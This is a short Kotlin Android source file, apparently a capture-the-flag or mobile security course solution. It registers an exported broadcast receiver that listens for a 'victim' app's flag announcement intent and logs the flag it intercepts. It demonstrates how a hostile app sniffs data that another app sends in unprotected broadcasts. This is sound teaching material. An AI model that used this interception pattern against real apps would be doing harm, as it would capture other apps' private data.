package com.example.maliciousapp

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Bundle
import android.util.Log

import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat

const val TAG = "MOBIOTSEC"

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val receiver = object : BroadcastReceiver() {
            override fun onReceive(context: Context, intent: Intent) {
                intent.getStringExtra("flag")?.let {
                    Log.d(TAG, it)
                }
            }
        }

        ContextCompat.registerReceiver(
            this,
            receiver,
            IntentFilter("victim.app.FLAG_ANNOUNCEMENT"),
            ContextCompat.RECEIVER_EXPORTED
        )
    }
}
